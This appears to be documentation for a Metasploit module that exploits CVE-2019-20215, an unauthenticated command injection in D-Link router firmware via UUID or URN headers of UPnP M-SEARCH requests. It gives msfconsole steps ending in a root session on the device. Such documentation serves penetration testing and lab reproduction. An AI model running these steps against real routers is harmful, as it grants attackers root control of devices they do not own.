## Vulnerable Application

### Introduction

This module exploits CVE-2019â€“20215, an unauthenticated remote injection of operating system commands.
The vulnerability was found in the ssdpcgi() function, and the payload can be injected through either the UUID
or URN headers of a M-SEARCH UPnP request.

Get a [D-Link router/vulnerable firmware](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10147),
or download firmware versions 1.06 or 1.05 and run them on firmadyne or similar emulation frameworks.

## Verification Steps

1. Set up router/emulated device
2. Start `msfconsole`
3. Do: `use exploit/linux/http/dlink_dir859_exec_ssdpcgi`
4. Do: `set RHOSTS <router_ip>`
5. Do: `set LHOST <local_ip>`
6. Do: `set TARGET <URN/UUID>`
7. Do: `run`
8. You should get a session as `root`.

## Options

**VECTOR**

This option denotes which header will be used in the request (UUID or URN)
that triggers the vulnerability.
